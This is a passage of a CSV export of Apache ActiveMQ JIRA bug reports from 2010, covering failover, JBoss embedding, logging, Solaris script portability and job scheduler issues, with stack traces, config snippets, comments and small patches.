a certain amount of time, it would be automatically routed to another broker.","CentOS 5.2 (2.6.18-128.1.10.el5.xs5.5.0.51xen), ActiveMQ server 5.4.0, ActiveMQ client 5.2.0 (w/ connection pooling)",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"08/Sep/10 22:06;cvelo;activemq_broker1.xml;https://issues.apache.org/jira/secure/attachment/12461852/activemq_broker1.xml",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,74765,,,Fri Sep 10 20:11:59 UTC 2010,,,,,,,,,,,"0|i0tsyf:",172000,,,,,,,,,,,,,,,,,,,,,"10/Sep/10 20:11;cvelo;Closing this ticket.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
failover: protocol doesn't work within a static:() URI in a networkConnector,AMQ-2904,12483501,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,gtully,gtully,07/Sep/10 14:12,07/Sep/10 14:43,14/Jul/23 05:43,07/Sep/10 14:43,5.4.0,,,,,5.4.1,,,Transport,,,,0,,,,,,,,,"Am configuring a networkConnector, and want it to do failover against two brokers. Xml config snippit:{code}
<networkConnectors>
            <networkConnector  uri=""static:(failover:(tcp://${activemq01.master.networkconnector.ip}:${activemq01.master.openwire.port},tcp://${activemq01.slave.networkconnector.ip}:${activemq01.slave.openwire.port})?randomize=true)""
                duplex=""true""
                networkTTL=""2""/>
        </networkConnectors>{code}
Problem is, the failoer doesn't work 

When activemq02 connects to activemq01, we see the following on activemq01:
{code}
INFO | Connector openwire Started
 INFO | ActiveMQ JMS Message Broker (activemq01, ID:Ade's-52856-1283520722984-0:0) started
 INFO | Connector vm://activemq01 Started
 INFO | Created Duplex Bridge back to activemq02
 INFO | Network connection between vm://activemq01#0 and tcp:///127.0.0.1:52864(activemq02) has been established.{code}
All good! If I take activemq01 down, then on reconnect, we don't see the duplex bridge get created. This is the output from activemq01.{code}

INFO | Recovery replayed 1 operations from the journal in 0.036 seconds.
 INFO | ActiveMQ 5.4.0-fuse-00-00 JMS Message Broker (activemq01) is starting
 INFO | For help or more information please see: http://activemq.apache.org/
 INFO | Scheduler using directory: activemq-data/scheduler
 INFO | Listening for connections at: tcp://0.0.0.0:61626
 INFO | Connector openwire Started
 INFO | ActiveMQ JMS Message Broker (activemq01, ID:Ade's-52922-1283520881264-0:0) started{code}
Note that there's no mention of a Duplex bridge. The output from the activemq02 broker says:
{code}
Transport (/127.0.0.1:61616) failed to tcp://127.0.0.1:61616 , attempting to automatically reconnect due to: java.io.EOFException
 INFO | Outbound transport to activemq01 interrupted.
 INFO | Network connection between vm://activemq02#0 and tcp://127.0.0.1:61626(activemq01) has been established.
 INFO | Outbound transport to activemq01 resumed
 INFO | Successfully reconnected to tcp://127.0.0.1:61626
 WARN | Unexpected extra broker info command received: BrokerInfo {commandId = 19, responseRequired = false, brokerId = ID:Ade's-52922-1283520881264-0:0, brokerURL = tcp://0.0.0.0:61626, slaveBroker = false, masterBroker = false, faultTolerantConfiguration = false, networkConnection = false, duplexConnection = false, peerBrokerInfos = [], brokerName = activemq01, connectionId = 0, brokerUploadUrl = null, networkProperties = null}{code}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14801,,,Tue Sep 07 14:43:19 UTC 2010,,,,,,,,,,,"0|i0ba87:",63769,Regression,,,,,,,,,,,,,,,,,,,,"07/Sep/10 14:21;gtully;Issue is related to interruption processing in the failover transport for an activemq client connection with active consumers. A network connector, just listening for consumer advisories does not need this feature. The interruption processing and replay of consumers in pull mode pending interruption processing completion should be limited to JMS consumer connections.;;;","07/Sep/10 14:42;gtully;AMQ-2579 introduced the new failover transport behavior that causes this issue. It should have been confined to activemq jms client consumer connections;;;","07/Sep/10 14:43;gtully;resolve in r993382;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
JBoss5.1 embedding - missing dependencies,AMQ-2903,12483663,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,,rjtokenlanring,rjtokenlanring,07/Sep/10 13:27,02/Nov/13 20:59,14/Jul/23 05:43,02/Nov/13 20:59,5.3.2,,,,,5.9.0,,,Broker,,,,0,,,,,,,,,"The default embedding rar deployment into JBoss AS version 5.1 doesn't start, throwing the following exception:

{code}
Caused by: java.lang.NoClassDefFoundError: org/apache/tools/ant/launch/AntMain
        at java.lang.ClassLoader.defineClass1(Native Method)
        at java.lang.ClassLoader.defineClassCond(ClassLoader.java:632)
        at java.lang.ClassLoader.defineClass(ClassLoader.java:616)
        at org.jboss.classloader.spi.base.BaseClassLoader.access$200(BaseClassLoader.java:63)
        at org.jboss.classloader.spi.base.BaseClassLoader$2.run(BaseClassLoader.java:572)
        at org.jboss.classloader.spi.base.BaseClassLoader$2.run(BaseClassLoader.java:532)
        at java.security.AccessController.doPrivileged(Native Method)
        at org.jboss.classloader.spi.base.BaseClassLoader.loadClassLocally(BaseClassLoader.java:530)
        at org.jboss.classloader.spi.base.BaseClassLoader.loadClassLocally(BaseClassLoader.java:507)
        at org.jboss.classloader.spi.base.BaseDelegateLoader.loadClass(BaseDelegateLoader.java:134)
        at org.jboss.classloader.spi.filter.FilteredDelegateLoader.loadClass(FilteredDelegateLoader.java:131)
        at org.jboss.classloader.spi.base.ClassLoadingTask$ThreadTask.run(ClassLoadingTask.java:452)
        at org.jboss.classloader.spi.base.ClassLoaderManager.nextTask(ClassLoaderManager.java:251)
        at org.jboss.classloader.spi.base.ClassLoaderManager.process(ClassLoaderManager.java:150)
        at org.jboss.classloader.spi.base.BaseClassLoaderDomain.loadClass(BaseClassLoaderDomain.java:265)
        at org.jboss.classloader.spi.base.BaseClassLoaderDomain.loadClass(BaseClassLoaderDomain.java:1119)
        at org.jboss.classloader.spi.base.BaseClassLoader.loadClassFromDomain(BaseClassLoader.java:798)
        at org.jboss.classloader.spi.base.BaseClassLoader.loadClass(BaseClassLoader.java:441)
        at java.lang.ClassLoader.loadClass(ClassLoader.java:248)
        at org.jboss.deployment.OptAnnotationMetaDataDeployer.processJBossClientMetaData(OptAnnotationMetaDataDeployer.java:115)
        at org.jboss.deployment.OptAnnotationMetaDataDeployer.processMetaData(OptAnnotationMetaDataDeployer.java:82)
        at org.jboss.deployment.AnnotationMetaDataDeployer.deploy(AnnotationMetaDataDeployer.java:177)
        at org.jboss.deployment.AnnotationMetaDataDeployer.deploy(AnnotationMetaDataDeployer.java:93)
        at org.jboss.deployers.plugins.deployers.DeployerWrapper.deploy(DeployerWrapper.java:171)
        ... 30 more
Caused by: java.lang.ClassNotFoundException: org.apache.tools.ant.launch.AntMain
        at java.net.URLClassLoader$1.run(URLClassLoader.java:202)
        at java.security.AccessController.doPrivileged(Native Method)
        at java.net.URLClassLoader.findClass(URLClassLoader.java:190)
        at java.lang.ClassLoader.loadClass(ClassLoader.java:307)
        at sun.misc.Launcher$AppClassLoader.loadClass(Launcher.java:301)
        at java.lang.ClassLoader.loadClass(ClassLoader.java:248)
        at java.lang.Class.forName0(Native Method)
        at java.lang.Class.forName(Class.java:247)
        at org.jboss.classloader.spi.base.BaseClassLoaderDomain.loadClass(BaseClassLoaderDomain.java:292)
        at org.jboss.classloader.spi.base.BaseClassLoaderDomain.loadClass(BaseClassLoaderDomain.java:1119)
        at org.jboss.classloader.spi.base.BaseClassLoader.loadClassFromDomain(BaseClassLoader.java:798)
        at org.jboss.classloader.spi.base.BaseClassLoader.loadClass(BaseClassLoader.java:441)
{code}

The issue can be avoided adding: ant-launcher.jar and ant.jar into rar deployer (I've tested version 1.7.1). ",,davsclaus,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,74766,,,Sat Nov 02 20:59:07 UTC 2013,,,,,,,Patch Available,,,,"0|i0amcv:",59895,,,,,,,,,,,,,,,,,,,,,"07/Sep/10 17:35;gtully;why do you think this is related to activemq? I am not aware of any mandatory ant dependency in activemq;;;","08/Sep/10 07:04;rjtokenlanring;Yes is not a direct dependency of AMQ, but  I think that this should be added to official AMQ documentation (ant jars).
I added this ticket because the official AMQ rar deployer package doesn't work with JBoss 5.1.;;;","02/Nov/13 20:59;davsclaus;The JCA RAR has been improved a lot in 5.9 and test on JBoss AS etc.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
ResourceAdapter logs confusing Exception upon pool connection disposal,AMQ-2902,12483456,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,,hennejg,hennejg,07/Sep/10 11:34,08/Oct/10 12:58,14/Jul/23 05:43,08/Oct/10 12:58,5.4.0,,,,,5.4.2,,,JCA Container,,,,2,,,,,,,,,"After upgrading to 5.4.0 we see many exceptions of the following kind being logged with level INFO:
{quote}
2010-09-07 13:23:25,824 INFO  [org.apache.activemq.broker.TransportConnection.Transport] Transport failed: org.apache.activemq.transport.TransportDisposedIOException: Peer (vm://caa.embedded?waitForStart=300000&async=false#13) disposed.
org.apache.activemq.transport.TransportDisposedIOException: Peer (vm://caa.embedded?waitForStart=300000&async=false#13) disposed.
	at org.apache.activemq.transport.vm.VMTransport.stop(VMTransport.java:159)
	at org.apache.activemq.transport.vm.VMTransportServer$1.stop(VMTransportServer.java:81)
	at org.apache.activemq.transport.TransportFilter.stop(TransportFilter.java:65)
	at org.apache.activemq.transport.TransportFilter.stop(TransportFilter.java:65)
	at org.apache.activemq.transport.ResponseCorrelator.stop(ResponseCorrelator.java:132)
	at org.apache.activemq.util.ServiceSupport.dispose(ServiceSupport.java:43)
	at org.apache.activemq.ActiveMQConnection.close(ActiveMQConnection.java:656)
	at org.apache.activemq.ra.ActiveMQManagedConnection.destroy(ActiveMQManagedConnection.java:207)
	at org.jboss.resource.connectionmanager.InternalManagedConnectionPool.doDestroy(InternalManagedConnectionPool.java:650)
	at org.jboss.resource.connectionmanager.InternalManagedConnectionPool.removeTimedOut(InternalManagedConnectionPool.java:481)
	at org.jboss.resource.connectionmanager.IdleRemover$IdleRemoverRunnable.run(IdleRemover.java:164)
	at java.lang.Thread.run(Thread.java:619)
{quote}
I suppose that the cause for the message is actually harmless - hence the INFO level - but the messages are confusing and annoying nonetheless.",AMQ 5.4.0 ResourceAdapter running with an embedded broker within JBoss 4.2.3,basti1302,hennejg,rjtokenlanring,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14843,,,Fri Oct 08 12:58:23 UTC 2010,,,,,,,,,,,"0|i0b9yf:",63725,,,,,,,,,,,,,,,,,,,,,"08/Sep/10 05:15;davsclaus;I have been told that this is harmless and have been fixed on trunk.;;;","22/Sep/10 09:31;rjtokenlanring;Also with 5.4.1 release (on JBoss 4.2.3.GA) this issue is present:

2010-09-22 11:29:31,458 INFO  [org.apache.activemq.broker.TransportConnection.Transport] Transport failed: org.apache.activemq.transport.TransportDisposedIOException: Peer (vm://localhost#37) disposed.
org.apache.activemq.transport.TransportDisposedIOException: Peer (vm://localhost#37) disposed.
        at org.apache.activemq.transport.vm.VMTransport.stop(VMTransport.java:159)
        at org.apache.activemq.transport.vm.VMTransportServer$1.stop(VMTransportServer.java:81)
        at org.apache.activemq.transport.TransportFilter.stop(TransportFilter.java:65)
        at org.apache.activemq.transport.TransportFilter.stop(TransportFilter.java:65)
        at org.apache.activemq.transport.ResponseCorrelator.stop(ResponseCorrelator.java:132)
        at org.apache.activemq.util.ServiceSupport.dispose(ServiceSupport.java:43)
        at org.apache.activemq.ActiveMQConnection.close(ActiveMQConnection.java:656)
        at org.apache.activemq.ra.ActiveMQManagedConnection.destroy(ActiveMQManagedConnection.java:207)
        at org.jboss.resource.connectionmanager.InternalManagedConnectionPool.doDestroy(InternalManagedConnectionPool.java:650)
        at org.jboss.resource.connectionmanager.InternalManagedConnectionPool.removeTimedOut(InternalManagedConnectionPool.java:481)
        at org.jboss.resource.connectionmanager.IdleRemover$IdleRemoverRunnable.run(IdleRemover.java:164)
        at java.lang.Thread.run(Thread.java:619)

But this affects the broker? This could bring to errors or broker faults?;;;","01/Oct/10 08:19;basti1302;I too see that issue in the current 5.4.1  release. This has nothing to do with JBoss. It is reproducible in an ordinary Java application (see below). Claus, who told you that is fixed in the trunk? From looking at the sources in the trunk I have the impression that the related code has not changed (but I'm guessing a bit here and could be wrong). The small test below reproduces the problem. Note that the exception gets logged less frequently if you start and stop the connection before closing it (enable the two commented lines). But it still occurs. It occurs every time if you do not start and stop the connection.


{code:title=AMQ2902.java|borderStyle=solid}
import javax.jms.Connection;
import javax.jms.ConnectionFactory;
import javax.jms.JMSException;

import org.apache.activemq.ActiveMQConnectionFactory;

public class AMQ2902
{
  public static void main(String[] arguments) throws JMSException
  {
    ConnectionFactory connectionFactory = new ActiveMQConnectionFactory(
        ""vm://localhost?broker.persistent=false"");
    Connection connection = connectionFactory.createConnection();
    // connection.start();
    // connection.stop();
    connection.close();
  }
}
{code} 

Kind regards,

  Bastian;;;","01/Oct/10 08:29;basti1302;The obvious workaround is to configure log4j to not show INFO level messages from the logger in question.


{noformat} 
  <logger name=""org.apache.activemq.broker.TransportConnection.Transport"">
    <level value=""warn"" />
  </logger>
{noformat} 


However, a possible (very simplistic) fix would be to change {{TRANSPORTLOG.info(""Transport failed: "" + e, e);}} into {{TRANSPORTLOG.info(""Transport failed: "" + e);}}  in {{org.apache.activemq.broker.TransportConnection}}. Since it is only a logging on info, the stack trace is probably not of interest anyway, right?

Patch:

{noformat} 
### Eclipse Workspace Patch 1.0
#P activemq-core
Index: src/main/java/org/apache/activemq/broker/TransportConnection.java
===================================================================
--- src/main/java/org/apache/activemq/broker/TransportConnection.java	(revision 1003422)
+++ src/main/java/org/apache/activemq/broker/TransportConnection.java	(working copy)
@@ -233,7 +233,7 @@
         if (!stopping.get()) {
             transportException.set(e);
             if (TRANSPORTLOG.isInfoEnabled()) {
-                TRANSPORTLOG.info(""Transport failed: "" + e, e);
+                TRANSPORTLOG.info(""Transport failed: "" + e);
             }
             stopAsync();
         }
{noformat} 
;;;","08/Oct/10 12:58;gtully;resolved in r1005094;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
java doc of activemq-camel component need to be updated,AMQ-2900,12483487,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,njiang,njiang,njiang,07/Sep/10 01:27,07/Sep/10 01:30,14/Jul/23 05:43,07/Sep/10 01:30,,,,,,5.4.1,,,,,,,0,,,,,,,,,"""http;//activem.apache.org/camel""  need to be changed to ""http://camel.apache.org""
and the java doc of JournalComponent.java is wrong.
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14828,,,Tue Sep 07 01:30:44 UTC 2010,,,,,,,,,,,"0|i0ba4n:",63753,,,,,,,,,,,,,,,,,,,,,"07/Sep/10 01:30;njiang;Committed the patch into ActiveMQ trunk.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
whoami not in PATH on Solaris,AMQ-2899,12483494,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,dejanb,joeseeder,joeseeder,06/Sep/10 16:01,26/Jan/12 11:30,14/Jul/23 05:43,07/Sep/10 11:32,5.4.0,,,,,5.4.1,,,,,,,0,,,,,,,,,"bin/activemq script has reference to missing command

Standard PATH for Solaris is /bin:/usr/bin and these folders do not contain 'whoami' this is located in /usr/ucb/bin which is rarely set in PATH 

I recommend use of $LOGNAME instead or detection of whoami location

","SunOS wsfmaz03 5.10 Generic_142901-06 i86pc i386 i86pc
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14804,,,Thu Jan 26 11:30:32 UTC 2012,,,,,,,,,,,"0|i0ba7z:",63768,,,,,,,,,,,,,,,,,,,,,"07/Sep/10 11:32;dejanb;Fixed with svn revision 993322.

It'd be great if you could test this new script in your environment;;;","26/Jan/12 11:30;christianh;The fix applied does not work on all Solaris installations as /ucr/ucb is not part of the minimal installation bundle.

My suggestion to replace the who am I or whoami is:

`who am i | cut -d "" "" -f 1`
From my tests this is platform independend, and for Solaris you can set the application user easy by setting it in activemq.xml from AMQ-2907 Solaris 10 SMF manifest
;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
grep option is not POSIX compliant,AMQ-2898,12483486,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,dejanb,joeseeder,joeseeder,06/Sep/10 15:56,07/Sep/10 08:57,14/Jul/23 05:43,07/Sep/10 08:57,5.4.0,,,,,5.4.1,,,,,,,0,,,,,,,,,"in the bin/activemq script use of -q option on standard grep is not working :

$./activemq status
grep: illegal option -- q
Usage: grep -hblcnsviw pattern file . . .
ERROR: There are syntax errors in '/etc/default/activemq'


after changing script to use ggrep which is the GNU grep in Solaris script no longer reported this issue

there can be 2 solutions:

use of POSIX compliant grep options or
detection of grep version and trying to use ggrep ","SunOS 5.10 Generic_142901-06 i86pc i386 i86pc
PATH=/usr/sfw/bin:/usr/ccs/bin:/usr/local/bin:/usr/postgres/8.3/bin/64:/usr/apache2/bin/:/usr/bin",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14806,,,Tue Sep 07 08:57:23 UTC 2010,,,,,,,,,,,"0|i0ba33:",63746,,,,,,,,,,,,,,,,,,,,,"07/Sep/10 08:57;dejanb;Fixed with svn revision 993286. Thanks.

Using stdout redirection to /dev/null instead of -q seems to be the easiest solution;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
JobSchedulerStore is not started unless a message requesting delayed delivery is added to the queue or a job list request is done in the admin console,AMQ-2897,12483509,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,dejanb,seime,seime,06/Sep/10 14:05,08/Sep/10 12:45,14/Jul/23 05:43,08/Sep/10 12:45,5.4.0,,,,,5.4.1,,,Broker,,,,0,,,,,,,,,"Problem: Job scheduler does not get started after broker restart.

1) Fire up the broker (using default config (bin/activemq console)
2) Start the client app (I'm using Mule)
3) Post a message to the queue with AMQ_SCHEDULED_DELAY set to some value (10000ms)
4) Shut down the broker
5) Fire up the broker again

Expected behavior: The broker would start the job scheduler and fire off the job waiting
Actual behavior: The job scheduler starts when 

1) a new message is posted to the queue with the AMQ_SCHEDULED_DELAY set
2) I click on the ""Scheduled"" link in the admin ui

","Ubuntu 10.04, Java1.6u20 64bit",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"06/Sep/10 14:07;seime;activemq.log.1;https://issues.apache.org/jira/secure/attachment/12461817/activemq.log.1","06/Sep/10 14:07;seime;activemq.log.2;https://issues.apache.org/jira/secure/attachment/12461818/activemq.log.2",,,,,,,,,,,,,,,,,,,,2.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14803,,,Wed Sep 08 12:45:39 UTC 2010,,,,,,,,,,,"0|i0ba1z:",63741,,,,,,,,,,,,,,,,,,,,,"06/Sep/10 14:07;seime;Log file using DEBUG level. The .2 is the result of the first broker start, and the .1 is the result of the second startup.;;;","08/Sep/10 12:45;dejanb;Fixed with svn revision 995016.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Can't use maven-eclipse-plugin on trunk,AMQ-2896,12483478,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,janstey,janstey,janstey,02/Sep/10 13:54,02/Sep/10 13:58,14/Jul/23 05:43,02/Sep/10 13:58,,,,,,5.4.1,6.0.0,,,,,,0,,,,,,,,,"When I run mvn eclipse:eclipse, I get the following error:

{code}
Caused by: org.apache.maven.artifact.resolver.ArtifactResolutionException: Failed to resolve artifact, possibly due to a repository list that is not appropriately equipped for this artifact's metadata.
  org.apache.maven.plugins:maven-eclipse-plugin:pom:2.8-SNAPSHOT

from the specified remote repositories:
  apache.snapshots (https://repository.apache.org/content/repositories/snapshots/),
  central (http://repo1.maven.org/maven2)


	at org.apache.maven.artifact.resolver.DefaultArtifactResolver.resolve(DefaultArtifactResolver.java:221)
	at org.apache.maven.artifact.resolver.DefaultArtifactResolver.resolve(DefaultArtifactResolver.java:90)
	at org.apache.maven.project.DefaultMavenProjectBuilder.findModelFromRepository(DefaultMavenProjectBuilder.java:558)
	... 24 more

{code}

Fixing this shortly...",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14814,,,Thu Sep 02 13:57:53 UTC 2010,,,,,,,,,,,"0|i0aldb:",59735,,,,,,,,,,,,,,,,,,,,,"02/Sep/10 13:57;janstey;Fixed in rev 991936.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Updating broker-config.xml for rar deployer,AMQ-2895,12483477,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,rjtokenlanring,rjtokenlanring,02/Sep/10 12:01,02/Sep/10 15:02,14/Jul/23 05:43,02/Sep/10 15:02,5.4.0,,,,,5.4.1,,,Documentation,,,,0,,,,,,,,,"The default broker-config.xml file is no more valid since xml schema validation introduced into 5.4.0 release.
Please find attached the corrected version. Also the default persistence manager was updated to KahaDB (is the default since 5.3 release).",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"02/Sep/10 12:02;rjtokenlanring;broker-config.xml;https://issues.apache.org/jira/secure/attachment/12461798/broker-config.xml",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14807,,,Thu Sep 02 15:02:58 UTC 2010,,,,,,,Patch Available,,,,"0|i0ba9b:",63774,,,,,,,,,,,,,,,,,,,,,"02/Sep/10 15:02;gtully;fixed in r991961, thanks for the feedback.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
ServerSessionImpl in module ra does not report exception with stacktrace,AMQ-2892,12483469,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,gtully,benoitx,benoitx,01/Sep/10 11:43,01/Sep/10 13:47,14/Jul/23 05:43,01/Sep/10 13:47,5.4.0,,,,,5.4.1,,,,,,,0,,,,,,,,,"The ServerSessionImpl code does not report errors correctly (i.e. never shows the stacktrace):

in the run() method, the catch is like this:
{code:title=ServerSessionImpl.java|borderStyle=solid}
            } catch (Throwable e) {
                stale = true;
                if ( log.isInfoEnabled() ) {
                    log.info(""Endpoint failed to process message. Reason: "" + e.getMessage());                    
                } else if ( log.isDebugEnabled() ) {
		    log.debug(""Endpoint failed to process message."", e);
                }
{code}
            

but this means that you will never see the actual exception...(since if DEBUG is enabled, INFO would usually always be, therefore only the log.info is only called and this does not provide the stacktrace...) the code would be better like this:

{code:title=ServerSessionImpl.java|borderStyle=solid}
            } catch (Throwable e) {
                stale = true;
                if ( log.isDebugEnabled() ) {
				 	log.debug(""Endpoint failed to process message."", e);
                } else if ( log.isInfoEnabled() ) {
                    log.info(""Endpoint failed to process message. Reason: "" + e.getMessage());                    
                } 
{code}",Mac OX 10.6,benoitx,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14812,,,Wed Sep 01 13:47:28 UTC 2010,,,,,,,,,,,"0|i0ba93:",63773,,,,,,,,,,,,,,,,,,,,,"01/Sep/10 13:47;gtully;applied suggestion in r991536 - thanks.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
